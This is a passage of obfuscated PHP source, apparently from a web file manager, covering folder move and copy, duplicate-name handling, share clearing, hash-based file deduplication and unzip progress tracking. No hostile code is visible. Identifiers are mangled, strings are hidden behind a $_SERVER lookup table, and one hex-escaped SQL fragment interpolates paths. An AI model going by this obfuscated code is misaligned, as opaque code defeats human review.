(!$½½àÂôà) { return; } $½½àÂôà = array_to_keyvalue($½½àÂôà, $£ÅùÌÈÚ[180]); foreach ($½½àÂôà as $Şá—“º) { $Ø•Ş°ìØ = $Şá—“º[$£ÅùÌÈÚ[179]]; $Ö²‡¬ô‹ = $Şá—“º[$£ÅùÌÈÚ[180]]; if (!isset($this->_childrenListCache[$Ö²‡¬ô‹]) && $Şá—“º[$£ÅùÌÈÚ[452]] == $£ÅùÌÈÚ[88]) { $this->_childrenListCache[$Ö²‡¬ô‹] = array(); } if (!isset($this->_childrenListCache[$Ø•Ş°ìØ])) { $this->_childrenListCache[$Ø•Ş°ìØ] = array(); } $this->_childrenListCache[$Ø•Ş°ìØ][$Ö²‡¬ô‹] = $Şá—“º; $this->_childrenItemCache[$Ö²‡¬ô‹] = $Şá—“º; } } private function _childrenListAll($’ìÌ , &$ıš„åÊä) { $¾†ıµ…• =& $_SERVER[™»È’øè]; if (!isset($this->_childrenListCache[$’ìÌ ])) { return; } $–¢Ôë‰ò = $this->_childrenListCache[$’ìÌ ]; foreach ($–¢Ôë‰ò as $“ãø©Ìå => $ÅÜ‹ÜÉĞ) { $ıš„åÊä[$“ãø©Ìå] = $ÅÜ‹ÜÉĞ; if ($ÅÜ‹ÜÉĞ[$¾†ıµ…•[452]] == $¾†ıµ…•[88]) { $this->_childrenListAll($“ãø©Ìå, $ıš„åÊä); } } } private function sourceInfoCache($ää°ğ©’) { if (isset($this->_childrenItemCache[$ää°ğ©’])) { return $this->_childrenItemCache[$ää°ğ©’]; } return $this->sourceInfo($ää°ğ©’); } private function _childrenList($—ÆÈ”) { if (isset($this->_childrenListCache[$—ÆÈ”])) { return $this->_childrenListCache[$—ÆÈ”]; } return $this->_childrenListSelect($—ÆÈ”); } private function _childrenListSelect($ê°³Ğöô) { $¿ ÍóÎ =& $_SERVER[™»È’øè]; $ÕÑ•ú²ü = array($¿ ÍóÎ[179] => $ê°³Ğöô, $¿ ÍóÎ[472] => $this->targetIsDelete); $œÚûèíù = $this->where($ÕÑ•ú²ü)->select(); $œÚûèíù = $œÚûèíù ? $œÚûèíù : array(); $ˆ¢áµ • = array_to_keyvalue($œÚûèíù, $¿ ÍóÎ[180]); $this->_childrenListCache[$ê°³Ğöô] = $ˆ¢áµ •; foreach ($ˆ¢áµ • as $ê°³Ğöô => $Úê®ÆÚ) { $this->_childrenItemCache[$ê°³Ğöô] = $Úê®ÆÚ; } return $ˆ¢áµ •; } private function fileNameExistCache($öŸĞÇ±ı, $ˆªŸ¨) { $·Èò’àÎ =& $_SERVER[™»È’øè]; $ˆªŸ¨ = strtolower($ˆªŸ¨); $ã¿ØÔ³Í = $this->_childrenList($öŸĞÇ±ı); foreach ($ã¿ØÔ³Í as $­Ë“àÈ¢) { if ($ˆªŸ¨ == strtolower($­Ë“àÈ¢[$·Èò’àÎ[32]])) { return $­Ë“àÈ¢[$·Èò’àÎ[180]]; } } return !1; } private function fileNameAutoCache($«ËÖ¾èó, $ãûÖ¼È, $Õ¯Ä­, $Ï¢ö­´ó) { $ƒ‘‰¤Ş‹ =& $_SERVER[™»È’øè]; $±Å¢¹ØÆ = $this->_childrenList($«ËÖ¾èó); $ğµ¿ ±ä = array_to_keyvalue($±Å¢¹ØÆ, $ƒ‘‰¤Ş‹[12], $ƒ‘‰¤Ş‹[32]); return $this->fileNameAutoGet($ğµ¿ ±ä, $ãûÖ¼È, $Õ¯Ä­, $Ï¢ö­´ó); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Ë¨ÒÆ¿“, $ÅÄ¶’¼¢, $¹×çé“º = REPEAT_REPLACE, $¥²¬»Õ¯ = '') { $‚ÁØ« =& $_SERVER[™»È’øè]; $ƒÀâ°®Ø = $this->sourceInfo($Ë¨ÒÆ¿“); $‹ùù³°¹ = $this->sourceInfo($ÅÄ¶’¼¢); if ($ƒÀâ°®Ø[$‚ÁØ«[179]] == $‹ùù³°¹[$‚ÁØ«[180]]) { if ($ƒÀâ°®Ø[$‚ÁØ«[472]] == $‚ÁØ«[88]) { Model($‚ÁØ«[470])->restore(array($Ë¨ÒÆ¿“)); } if (!$¥²¬»Õ¯ || $¥²¬»Õ¯ == $ƒÀâ°®Ø[$‚ÁØ«[32]]) { return $Ë¨ÒÆ¿“; } } $äşÄş„ë = $this->pathInfoMore($Ë¨ÒÆ¿“); if ($this->isParentOf($Ë¨ÒÆ¿“, $ÅÄ¶’¼¢)) { return !1; } if (!$ƒÀâ°®Ø || !$‹ùù³°¹ || $‹ùù³°¹[$‚ÁØ«[452]] != $‚ÁØ«[88]) { return !1; } Hook::trigger($‚ÁØ«[625], $äşÄş„ë); $this->targetIsDelete = intval($ƒÀâ°®Ø[$‚ÁØ«[472]]); if ($ƒÀâ°®Ø[$‚ÁØ«[179]] == $ÅÄ¶’¼¢ && $¥²¬»Õ¯ != $ƒÀâ°®Ø[$‚ÁØ«[32]]) { $¸ËîÄ² = $this->fileNameExist($ÅÄ¶’¼¢, $¥²¬»Õ¯); if ($¸ËîÄ² && $ƒÀâ°®Ø[$‚ÁØ«[452]] == $‚ÁØ«[211]) { $õôì€ƒî = $this->sourceInfo($¸ËîÄ²); $†Ãƒ½á = $this->fileHistory($õôì€ƒî, $ƒÀâ°®Ø[$‚ÁØ«[508]], $ƒÀâ°®Ø[$‚ÁØ«[76]]); if (!$†Ãƒ½á) { Model($‚ÁØ«[511])->remove($ƒÀâ°®Ø[$‚ÁØ«[508]]); } $this->removeNow($Ë¨ÒÆ¿“, !1); $this->folderSizeReset($ÅÄ¶’¼¢); Hook::trigger($‚ÁØ«[626], $äşÄş„ë); return $¸ËîÄ²; } } $ËÍó“ˆ = $¥²¬»Õ¯ ? $¥²¬»Õ¯ : $ƒÀâ°®Ø[$‚ÁØ«[32]]; $this->lockMoveStart($Ë¨ÒÆ¿“); $this->lockWriteStart($ÅÄ¶’¼¢, $ËÍó“ˆ); $º¡ ‡íõ = array($‚ÁØ«[596] => array(), $‚ÁØ«[627] => !1); $this->clearShare($Ë¨ÒÆ¿“, $ÅÄ¶’¼¢); $Ÿ²ù• = $this->fileNameExistCache($ÅÄ¶’¼¢, $ƒÀâ°®Ø[$‚ÁØ«[32]]); $ëÈê£õ‚ = $this->_move($Ë¨ÒÆ¿“, $ÅÄ¶’¼¢, $¹×çé“º, $º¡ ‡íõ, $¥²¬»Õ¯); $this->sourceCacheClear(); if ($ƒÀâ°®Ø[$‚ÁØ«[452]] == $‚ÁØ«[88] && $Ÿ²ù•) { $this->folderSizeResetChildren($ëÈê£õ‚); } Model($‚ÁØ«[213])->linkAdd($º¡ ‡íõ[$‚ÁØ«[596]]); if ($Ÿ²ù• && $º¡ ‡íõ[$‚ÁØ«[627]]) { $this->removeNow($Ë¨ÒÆ¿“, !1); } $this->lockMoveEnd($Ë¨ÒÆ¿“); $this->lockWriteEnd($ÅÄ¶’¼¢, $ËÍó“ˆ); $this->folderSizeReset($ƒÀâ°®Ø[$‚ÁØ«[179]]); $this->folderSizeReset($ÅÄ¶’¼¢); $ÆÌÑëé = array($ƒÀâ°®Ø[$‚ÁØ«[179]], $ÅÄ¶’¼¢); if ($ƒÀâ°®Ø[$‚ÁØ«[452]] == $‚ÁØ«[88]) { $ÆÌÑëé[] = $Ë¨ÒÆ¿“; } $this->updateModifyTime($ÆÌÑëé); Model($‚ÁØ«[600])->eventMove($Ë¨ÒÆ¿“, $ƒÀâ°®Ø[$‚ÁØ«[179]], $ÅÄ¶’¼¢); Hook::trigger($‚ÁØ«[626], $äşÄş„ë); return $ëÈê£õ‚; } private function _move($§›É×£, $¦ğÚ³œ·, $€ÈÁàØ™, &$°§ÛÒŒù, $êÂÖšÀË = '') { $™à¡ï¢² =& $_SERVER[™»È’øè]; $…úìã½ = $this->sourceInfo($§›É×£); $Õ˜­ÑÏÎ = $…úìã½[$™à¡ï¢²[452]] == $™à¡ï¢²[88]; $¿µëûß€ = $êÂÖšÀË ? $êÂÖšÀË : $…úìã½[$™à¡ï¢²[32]]; $ş“ëÙÚ = $this->fileNameExistCache($¦ğÚ³œ·, $¿µëûß€); $this->lockMoveStart($§›É×£); $this->lockWriteStart($¦ğÚ³œ·, $¿µëûß€); if (!$ş“ëÙÚ) { return $this->_moveForce($§›É×£, $¦ğÚ³œ·, $¿µëûß€); } $åª´’èŒ = $ş“ëÙÚ; $†”¾åè = !1; if ($Õ˜­ÑÏÎ) { if ($€ÈÁàØ™ == REPEAT_RENAME_FOLDER) { $¿µëûß€ = $this->fileNameAuto($¦ğÚ³œ·, $¿µëûß€, $€ÈÁàØ™, $Õ˜­ÑÏÎ); $åª´’èŒ = $this->_moveForce($§›É×£, $¦ğÚ³œ·, $¿µëûß€); } else { if ($€ÈÁàØ™ == REPEAT_RENAME_FOLDER) { $€ÈÁàØ™ = REPEAT_RENAME; } $ÉÚÚßÓº = $this->_childrenListSelect($§›É×£); foreach ($ÉÚÚßÓº as $½Æª¨†) { $this->_move($½Æª¨†[$™à¡ï¢²[180]], $ş“ëÙÚ, $€ÈÁàØ™, $°§ÛÒŒù); } $†”¾åè = !0; } } else { if ($€ÈÁàØ™ == REPEAT_SKIP) { $†”¾åè = !0; } else { if ($€ÈÁàØ™ == REPEAT_RENAME || $€ÈÁàØ™ == REPEAT_RENAME_FOLDER) { $¿µëûß€ = $this->fileNameAuto($¦ğÚ³œ·, $¿µëûß€, $€ÈÁàØ™, $Õ˜­ÑÏÎ); $åª´’èŒ = $this->_moveForce($§›É×£, $¦ğÚ³œ·, $¿µëûß€); } else { if ($€ÈÁàØ™ == REPEAT_REPLACE) { $êğÁ¥˜å = $this->sourceInfoCache($ş“ëÙÚ); $±¤ÚŒâ = $this->fileHistory($êğÁ¥˜å, $…úìã½[$™à¡ï¢²[508]], $…úìã½[$™à¡ï¢²[76]]); $†”¾åè = !0; if ($±¤ÚŒâ) { $°§ÛÒŒù[$™à¡ï¢²[596]][] = $…úìã½[$™à¡ï¢²[508]]; } } } } } if ($†”¾åè && !$°§ÛÒŒù[$™à¡ï¢²[627]]) { $°§ÛÒŒù[$™à¡ï¢²[627]] = !0; } return $åª´’èŒ; } private function _moveForce($ÂùøÍİ‰, $¯¬èì·, $î¦¾ ü­) { $¦ Ñ© =& $_SERVER[™»È’øè]; $òµÎŞ·¨ = $this->sourceInfo($ÂùøÍİ‰); $÷ÏòûİÄ = $this->sourceInfo($¯¬èì·); $ù˜¦¢„® = $òµÎŞ·¨[$¦ Ñ©[452]] == $¦ Ñ©[88]; $òÈååïó = array($¦ Ñ©[444] => $÷ÏòûİÄ[$¦ Ñ©[180]], $¦ Ñ©[619] => $÷ÏòûİÄ[$¦ Ñ©[552]] . $÷ÏòûİÄ[$¦ Ñ©[180]] . $¦ Ñ©[50], $¦ Ñ©[615] => $÷ÏòûİÄ[$¦ Ñ©[177]], $¦ Ñ©[616] => $÷ÏòûİÄ[$¦ Ñ©[537]], $¦ Ñ©[618] => USER_ID, $¦ Ñ©[461] => $î¦¾ ü­); $ü­Øğ­‘ = $òµÎŞ·¨[$¦ Ñ©[177]] == SourceModel::TYPE_GROUP && $÷ÏòûİÄ[$¦ Ñ©[177]] == SourceModel::TYPE_GROUP && $òµÎŞ·¨[$¦ Ñ©[537]] == $÷ÏòûİÄ[$¦ Ñ©[537]]; if (!$ü­Øğ­‘ && $this->moveClearAuth) { Model($¦ Ñ©[534])->authClear($ÂùøÍİ‰); } $ò¿Ÿ¯ôµ = $òµÎŞ·¨[$¦ Ñ©[472]] == $¦ Ñ©[88] && $÷ÏòûİÄ[$¦ Ñ©[472]] != $¦ Ñ©[88]; if ($ò¿Ÿ¯ôµ) { $òÈååïó[$¦ Ñ©[471]] = 0; } if ($ù˜¦¢„®) { $Ç£„¢«® = array($¦ Ñ©[619] => array($¦ Ñ©[579], $òµÎŞ·¨[$¦ Ñ©[552]] . $òµÎŞ·¨[$¦ Ñ©[180]] . $¦ Ñ©[580])); $ªôšÓİ÷ = $òµÎŞ·¨[$¦ Ñ©[552]] . $òµÎŞ·¨[$¦ Ñ©[180]] . $¦ Ñ©[50]; $€ùùÉ±¡ = $÷ÏòûİÄ[$¦ Ñ©[552]] . $÷ÏòûİÄ[$¦ Ñ©[180]] . $¦ Ñ©[50] . $òµÎŞ·¨[$¦ Ñ©[180]] . $¦ Ñ©[50]; $îó–Ş¤´ = array($¦ Ñ©[619] => array($¦ Ñ©[628], "\x72\145\160\154\x61\143\x65\x28\x70\141\162\x65\x6e\164\x4c\x65\x76\145\x6c\54\x27{$ªôšÓİ÷}\x27\54\x27{$€ùùÉ±¡}\x27\x29"), $¦ Ñ©[615] => $÷ÏòûİÄ[$¦ Ñ©[177]], $¦ Ñ©[616] => $÷ÏòûİÄ[$¦ Ñ©[537]]); if ($ò¿Ÿ¯ôµ) { $îó–Ş¤´[$¦ Ñ©[471]] = 0; } $this->where($Ç£„¢«®)->data($îó–Ş¤´)->save(); } $this->where(array($¦ Ñ©[458] => $ÂùøÍİ‰))->data($òÈååïó)->save(); return $ÂùøÍİ‰; } private function clearShare($Ì£öõùï, $€’…Çµş) { $•àø¾‡¬ =& $_SERVER[™»È’øè]; $Š—»–”Â = $this->sourceInfo($Ì£öõùï); $ÓŸµ®®æ = $this->sourceInfo($€’…Çµş); if ($Š—»–”Â[$•àø¾‡¬[537]] == $ÓŸµ®®æ[$•àø¾‡¬[537]] && $Š—»–”Â[$•àø¾‡¬[177]] == $•àø¾‡¬[629]) { return; } $ß¯†›å« = array($•àø¾‡¬[552] => array($•àø¾‡¬[579], $Š—»–”Â[$•àø¾‡¬[552]] . $Ì£öõùï . $•àø¾‡¬[580])); $³®Ñ¶ãÛ = $this->field($•àø¾‡¬[458])->where($ß¯†›å«)->getField($•àø¾‡¬[180], !0); if (!$³®Ñ¶ãÛ) { return; } $ß¯†›å« = array($•àø¾‡¬[180] => array($•àø¾‡¬[7], $³®Ñ¶ãÛ), $•àø¾‡¬[630] => 1); $ÒíóÍæŞ = Model($•àø¾‡¬[631])->field($•àø¾‡¬[632])->where($ß¯†›å«)->select(); if (!$ÒíóÍæŞ) { return; } $ÒíóÍæŞ = array_to_keyvalue($ÒíóÍæŞ, $•àø¾‡¬[12], $•àø¾‡¬[632]); $ß¯†›å« = array($•àø¾‡¬[632] => array($•àø¾‡¬[7], $ÒíóÍæŞ)); Model($•àø¾‡¬[631])->where($ß¯†›å«)->save(array($•àø¾‡¬[630] => 0)); Model($•àø¾‡¬[633])->where($ß¯†›å«)->delete(); } public function copyFolderFromIO($“Êƒ‚µí, $ˆÌµäßİ, $”™ò‹í, $ò˜âÃó, $Ÿ¤Û‘Ô¹, $¤·•¦ğÄ = false) { $ìÌõ²Ó =& $_SERVER[™»È’øè]; $†Í©ÔøÇ = array($ìÌõ²Ó[597] => array(), $ìÌõ²Ó[598] => array(), $ìÌõ²Ó[596] => array(), $ìÌõ²Ó[634] => array()); $…Š—ºéÁ = $¤·•¦ğÄ ? $¤·•¦ğÄ : $“Êƒ‚µí->pathThis($ˆÌµäßİ); $›…ú™ = $this->fileNameExist($”™ò‹í, $…Š—ºéÁ); $ÔÙşõî = $this->mkdir($”™ò‹í, $…Š—ºéÁ, $ò˜âÃó); if (!$›…ú™ || $ò˜âÃó == REPEAT_RENAME_FOLDER) { $ò˜âÃó = !1; } if ($›…ú™) { $this->_childrenAllMake($›…ú™); } Hook::trigger($ìÌõ²Ó[635]); $this->_copyChildTo($“Êƒ‚µí, $ˆÌµäßİ, $ÔÙşõî, $ò˜âÃó, $†Í©ÔøÇ, $Ÿ¤Û‘Ô¹); Hook::trigger($ìÌõ²Ó[636]); if ($ÔÙşõî) { $this->folderSizeResetChildren($ÔÙşõî); } $this->_childrenListClear(); Model($ìÌõ²Ó[599])->addAll($†Í©ÔøÇ[$ìÌõ²Ó[597]], array(), !0); Model($ìÌõ²Ó[600])->eventCopy($ÔÙşõî); $this->saveAll($†Í©ÔøÇ[$ìÌõ²Ó[598]]); Model($ìÌõ²Ó[511])->linkAdd($†Í©ÔøÇ[$ìÌõ²Ó[596]]); Model($ìÌõ²Ó[511])->remove($†Í©ÔøÇ[$ìÌõ²Ó[634]]); $this->folderSizeReset($”™ò‹í); $this->updateModifyTime($”™ò‹í); return $ÔÙşõî; } private function _copyChildTo($“ÄêÃ‡, $àßäŒ÷Á, $œğÂªÚ, $†“Š‡á, &$÷¡¦¿Â, $ “¶ÅÎ¾) { $†¿œâËù =& $_SERVER[™»È’øè]; $íùğüªë = $this->sourceInfoCache($œğÂªÚ); $ÆÄ¶ ® = $“ÄêÃ‡->listPath($àßäŒ÷Á); $ÆÄ¶ ® = $ÆÄ¶ ® ? $ÆÄ¶ ® : array($†¿œâËù[83] => array(), $†¿œâËù[82] => array()); $Ó‘£¥× = array_merge($ÆÄ¶ ®[$†¿œâËù[83]], $ÆÄ¶ ®[$†¿œâËù[82]]); $Äù„Í„¸ = $this->_addFiles($“ÄêÃ‡, $ÆÄ¶ ®[$†¿œâËù[83]], $ “¶ÅÎ¾); $ÏŠÚï¨… = array(); foreach ($Ó‘£¥× as &$ëÍ¿Äé§) { if (isset($Äù„Í„¸[$ëÍ¿Äé§[$†¿œâËù[32]]])) { $ëÍ¿Äé§ = $Äù„Í„¸[$ëÍ¿Äé§[$†¿œâËù[32]]]; } $ëÍ¿Äé§[$†¿œâËù[452]] = $ëÍ¿Äé§[$†¿œâËù[33]] == $†¿œâËù[75]; $ëÍ¿Äé§[$†¿œâËù[453]] = substr(_get($ëÍ¿Äé§, $†¿œâËù[174], $†¿œâËù[12]), 0, 10); $ëÍ¿Äé§[$†¿œâËù[76]] = _get($ëÍ¿Äé§, $†¿œâËù[76], 0); $ëÍ¿Äé§[$†¿œâËù[508]] = _get($ëÍ¿Äé§, $†¿œâËù[508], 0); if (!isset($ëÍ¿Äé§[$†¿œâËù[637]]) && $ëÍ¿Äé§[$†¿œâËù[508]]) { $÷¡¦¿Â[$†¿œâËù[634]][] = $ëÍ¿Äé§[$†¿œâËù[508]]; } if ($†“Š‡á) { $áøØïî = $this->fileNameExistCache($œğÂªÚ, $ëÍ¿Äé§[$†¿œâËù[32]]); if ($áøØïî) { if ($ëÍ¿Äé§[$†¿œâËù[452]] || $†“Š‡á == REPEAT_SKIP) { continue; } if ($†“Š‡á == REPEAT_REPLACE) { $å½×Ñİ’ = $this->sourceInfoCache($áøØïî); $½ƒ³éˆ— = $this->fileHistory($å½×Ñİ’, $ëÍ¿Äé§[$†¿œâËù[508]], $ëÍ¿Äé§[$†¿œâËù[76]]); if ($½ƒ³éˆ—) { $÷¡¦¿Â[$†¿œâËù[596]][] = $ëÍ¿Äé§[$†¿œâËù[508]]; } continue; } else { if ($†“Š‡á == REPEAT_RENAME) { $ëÍ¿Äé§[$†¿œâËù[32]] = $this->fileNameAutoCache($œğÂªÚ, $ëÍ¿Äé§[$†¿œâËù[32]], $†“Š‡á, !1); } } } } if (!$ëÍ¿Äé§[$†¿œâËù[452]] && $ëÍ¿Äé§[$†¿œâËù[508]] == 0) { continue; } if (!$ëÍ¿Äé§[$†¿œâËù[452]] && $ëÍ¿Äé§[$†¿œâËù[508]]) { $÷¡¦¿Â[$†¿œâËù[596]][] = $ëÍ¿Äé§[$†¿œâËù[508]]; } $ÏŠÚï¨…[] = $this->_makeItemData($ëÍ¿Äé§, $íùğüªë, $ëÍ¿Äé§[$†¿œâËù[32]]); } unset($ëÍ¿Äé§); if (!empty($ÏŠÚï¨…)) { $this->addAll($ÏŠÚï¨…); $this->_childrenListSelect($œğÂªÚ); } $ú×ı±æÁ = $this->_childrenList($œğÂªÚ); $ú×ı±æÁ = array_to_keyvalue($ú×ı±æÁ, $†¿œâËù[32]); foreach ($Ó‘£¥× as $ëÍ¿Äé§) { $å½×Ñİ’ = $ú×ı±æÁ[$ëÍ¿Äé§[$†¿œâËù[32]]]; $Ô×õ™’ = $å½×Ñİ’[$†¿œâËù[180]]; $this->_copyApplyMeta($å½×Ñİ’, $÷¡¦¿Â); if ($ëÍ¿Äé§[$†¿œâËù[33]] == $†¿œâËù[75]) { $ëÍ¿Äé§[$†¿œâËù[84]] = $“ÄêÃ‡->getPathInner($ëÍ¿Äé§[$†¿œâËù[84]]); $this->_copyChildTo($“ÄêÃ‡, $ëÍ¿Äé§[$†¿œâËù[84]], $Ô×õ™’, $†“Š‡á, $÷¡¦¿Â, $ “¶ÅÎ¾); } } } private function _addFiles($Ì«Áƒé, $åä«ñì¥, $¼³µñ°Ö) { $ĞÊ¿Ë¬° =& $_SERVER[™»È’øè]; if (!$åä«ñì¥ || count($åä«ñì¥) == 0) { return array(); } $õÑŒ˜µ® = array(); foreach ($åä«ñì¥ as &$ÇÑÛâ°°) { Hook::trigger($ĞÊ¿Ë¬°[638], $ÇÑÛâ°°); $ÇÑÛâ°°[$ĞÊ¿Ë¬°[84]] = $Ì«Áƒé->getPathInner($ÇÑÛâ°°[$ĞÊ¿Ë¬°[84]]); $şè­Çíœ = $Ì«Áƒé->hashSimple($ÇÑÛâ°°[$ĞÊ¿Ë¬°[84]]); $µ‡˜«œ’ = $Ì«Áƒé->hashMd5($ÇÑÛâ°°[$ĞÊ¿Ë¬°[84]]); if (strlen($µ‡˜«œ’) > 10 && !isset($õÑŒ˜µ®[$µ‡˜«œ’])) { $õÑŒ˜µ®[$µ‡˜«œ’] = array(); } $ÇÑÛâ°°[$ĞÊ¿Ë¬°[639]] = $şè­Çíœ; $ÇÑÛâ°°[$ĞÊ¿Ë¬°[640]] = $µ‡˜«œ’; $õÑŒ˜µ®[$µ‡˜«œ’][] =& $ÇÑÛâ°°; if (count($õÑŒ˜µ®[$µ‡˜«œ’]) > 1) { $ÇÑÛâ°°[$ĞÊ¿Ë¬°[637]] = !0; } Hook::trigger($ĞÊ¿Ë¬°[641], $ÇÑÛâ°°); } unset($ÇÑÛâ°°); $õ›‘£ğï = array($ĞÊ¿Ë¬°[640] => array($ĞÊ¿Ë¬°[7], array_keys($õÑŒ˜µ®))); $€€—™áš = Model($ĞÊ¿Ë¬°[642]); $²ìñÓ¥ş = $€€—™áš->where($õ›‘£ğï)->select(); $²ìñÓ¥ş = $²ìñÓ¥ş ? $²ìñÓ¥ş : array(); foreach ($²ìñÓ¥ş as $ø•£¼õ¢) { if (!isset($õÑŒ˜µ®[$ø•£¼õ¢[$ĞÊ¿Ë¬°[640]]])) { continue; } $˜ĞıàŸ = $õÑŒ˜µ®[$ø•£¼õ¢[$ĞÊ¿Ë¬°[640]]]; foreach ($˜ĞıàŸ as &$ÇÑÛâ°°) { $ÇÑÛâ°°[$ĞÊ¿Ë¬°[508]] = $ø•£¼õ¢[$ĞÊ¿Ë¬°[508]]; $ÇÑÛâ°°[$ĞÊ¿Ë¬°[637]] = !0; } unset($ÇÑÛâ°°); } $ Õ™š†Â = array(); foreach ($åä«ñì¥ as $Á¼å©›™) { Hook::trigger($ĞÊ¿Ë¬°[643], $Á¼å©›™); if (isset($Á¼å©›™[$ĞÊ¿Ë¬°[637]]) && $Á¼å©›™[$ĞÊ¿Ë¬°[637]]) { Hook::trigger($ĞÊ¿Ë¬°[644], $Á¼å©›™); continue; } $›™ÄÛ = $Ì«Áƒé->getPathInner($Á¼å©›™[$ĞÊ¿Ë¬°[84]]); $Şš˜­‚ = $€€—™áš->addFileMake($›™ÄÛ, $Á¼å©›™[$ĞÊ¿Ë¬°[76]], $Á¼å©›™[$ĞÊ¿Ë¬°[639]], $Á¼å©›™[$ĞÊ¿Ë¬°[640]], $Á¼å©›™[$ĞÊ¿Ë¬°[32]], $¼³µñ°Ö); Hook::trigger($ĞÊ¿Ë¬°[644], $Á¼å©›™); if (!is_array($Şš˜­‚)) { continue; } $ Õ™š†Â[] = $Şš˜­‚; } $€€—™áš->addAll($ Õ™š†Â); $õ›‘£ğï = array($ĞÊ¿Ë¬°[640] => array($ĞÊ¿Ë¬°[7], array_keys($õÑŒ˜µ®))); $²ìñÓ¥ş = $€€—™áš->where($õ›‘£ğï)->select(); $²ìñÓ¥ş = $²ìñÓ¥ş ? $²ìñÓ¥ş : array(); foreach ($²ìñÓ¥ş as $ø•£¼õ¢) { if (!isset($õÑŒ˜µ®[$ø•£¼õ¢[$ĞÊ¿Ë¬°[640]]])) { continue; } $†Êşå¹ =& $õÑŒ˜µ®[$ø•£¼õ¢[$ĞÊ¿Ë¬°[640]]]; foreach ($†Êşå¹ as &$ÇÑÛâ°°) { $ÇÑÛâ°°[$ĞÊ¿Ë¬°[508]] = $ø•£¼õ¢[$ĞÊ¿Ë¬°[508]]; } unset($ÇÑÛâ°°); } $ƒ‹¹¿É— = array(); foreach ($åä«ñì¥ as $ïû¨ƒµ¬) { $ƒ‹¹¿É—[$ïû¨ƒµ¬[$ĞÊ¿Ë¬°[32]]] = $ïû¨ƒµ¬; } return $ƒ‹¹¿É—; } } goto AÀª¾¥ñò; e¹Í«÷¤‘¸: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ÜÎ–’¾Ø =& $_SERVER[™»È’øè]; parent::startAfter(); Hook::bind($ÜÎ–’¾Ø[1791], array($this, $ÜÎ–’¾Ø[1792])); Hook::bind($ÜÎ–’¾Ø[1223], array($this, $ÜÎ–’¾Ø[1793])); $Û¶´œöö =& $this->task; $Û¶´œöö[$ÜÎ–’¾Ø[1794]] = $ÜÎ–’¾Ø[1224]; if (!$Û¶´œöö[$ÜÎ–’¾Ø[1573]]) { $Û¶´œöö[$ÜÎ–’¾Ø[1573]] = LNG($ÜÎ–’¾Ø[1795]); } } protected function endAfter() { $İ˜›œĞÎ =& $_SERVER[™»È’øè]; parent::endAfter(); Hook::unbind($İ˜›œĞÎ[1791], array($this, $İ˜›œĞÎ[1792])); Hook::unbind($İ˜›œĞÎ[1223], array($this, $İ˜›œĞÎ[1793])); } public function updateAfter() { $—Í„‹…ù =& $_SERVER[™»È’øè]; $Œ§îËûĞ =& $this->task; if (!$Œ§îËûĞ[$—Í„‹…ù[811]] || !$Œ§îËûĞ[$—Í„‹…ù[788]]) { return; } if ($Œ§îËûĞ[$—Í„‹…ù[1794]] == $—Í„‹…ù[1224]) { $Æß¡®¿ = 0; if ($Œ§îËûĞ[$—Í„‹…ù[1731]]) { $Æß¡®¿ = $Œ§îËûĞ[$—Í„‹…ù[1732]] / $Œ§îËûĞ[$—Í„‹…ù[1731]]; } $Œ§îËûĞ[$—Í„‹…ù[1680]] = $Æß¡®¿ * 0.3; } else { if ($Œ§îËûĞ[$—Í„‹…ù[1794]] == $—Í„‹…ù[356]) { $Æß¡®¿ = $Œ§îËûĞ[$—Í„‹…ù[1679]] / $Œ§îËûĞ[$—Í„‹…ù[811]]; $Œ§îËûĞ[$—Í„‹…ù[1680]] = 0.3 + $Æß¡®¿ * 0.4; } else { if ($Œ§îËûĞ[$—Í„‹…ù[1794]] == $—Í„‹…ù[107]) { $«Ã´Õ‘ = 0; if ($Œ§îËûĞ[$—Í„‹…ù[1733]] == $—Í„‹…ù[107]) { $«Ã´Õ‘ = $Œ§îËûĞ[$—Í„‹…ù[1732]]; } $Æß¡®¿ = ($Œ§îËûĞ[$—Í„‹…ù[1736]] + $«Ã´Õ‘) / $Œ§îËûĞ[$—Í„‹…ù[788]]; $Œ§îËûĞ[$—Í„‹…ù[1680]] = 0.3 + 0.4 + $Æß¡®¿ * 0.3; } } } if ($Œ§îËûĞ[$—Í„‹…ù[1680]] > 0) { $üÂ·ÚÙ = timeFloat() - $Œ§îËûĞ[$—Í„‹…ù[1682]] - $Œ§îËûĞ[$—Í„‹…ù[1685]]; $Œ§îËûĞ[$—Í„‹…ù[1686]] = $üÂ·ÚÙ * (1 - $Œ§îËûĞ[$—Í„‹…ù[1680]]) / $Œ§îËûĞ[$—Í„‹…ù[1680]]; } } public function addFile($©¿ğÕŠ) { $Œ£¤Äí· =& $_SERVER[™»È’øè]; $ú±Ã¥±¶ =& $this->task; $áó­ï“• = IO::info($©¿ğÕŠ); $ú±Ã¥±¶[$Œ£¤Äí·[1729]] = $áó­ï“•[$Œ£¤Äí·[32]]; $ú±Ã¥±¶[$Œ£¤Äí·[1731]] = $áó­ï“•[$Œ£¤Äí·[76]]; $ú±Ã¥±¶[$Œ£¤Äí·[1732]] = 0; $ú±Ã¥±¶[$Œ£¤Äí·[1094]] = $Œ£¤Äí·[1752]; $ú±Ã¥±¶[$Œ£¤Äí·[1733]] = $Œ£¤Äí·[1224]; $ú±Ã¥±¶[$Œ£¤Äí·[788]] = $áó­ï“•[$Œ£¤Äí·[76]]; $ú±Ã¥±¶[$Œ£¤Äí·[811]] = 1; $±¤«‰§ä = 0; $ú±Ã¥±¶[$Œ£¤Äí·[1740]] = array($Œ£¤Äí·[1741] => $±¤«‰§ä + 1, $Œ£¤Äí·[461] => $áó­ï“•[$Œ£¤Äí·[32]], $Œ£¤Äí·[84] => $áó­ï“•[$Œ£¤Äí·[84]], $Œ£¤Äí·[550] => $áó­ï“•[$Œ£¤Äí·[550]] ? $áó­ï“•[$Œ£¤Äí·[550]] : $áó­ï“•[$Œ£¤Äí·[84]]); $this->update(); } public function unzipAfter($¤¡ùÈ) { $´šµŞ‰× =& $_SERVER[™»È’øè]; $Ğ¥Â¦«” =& $this->task; $Ğ¥Â¦«”[$´šµŞ‰×[1794]] = $´šµŞ‰×[107]; $õ§ÁÍÊò = IO::infoWithChildren($¤¡ùÈ); $ ‹şŞ = 0; $Ğ¥Â¦«”[$´šµŞ‰×[1740]] = array($´šµŞ‰×[1741] => $ ‹şŞ + 1, $´šµŞ‰×[461] => $õ§ÁÍÊò[$´šµŞ‰×[32]], $´šµŞ‰×[84] => $õ§ÁÍÊò[$´šµŞ‰×[84]], $´šµŞ‰×[550] => 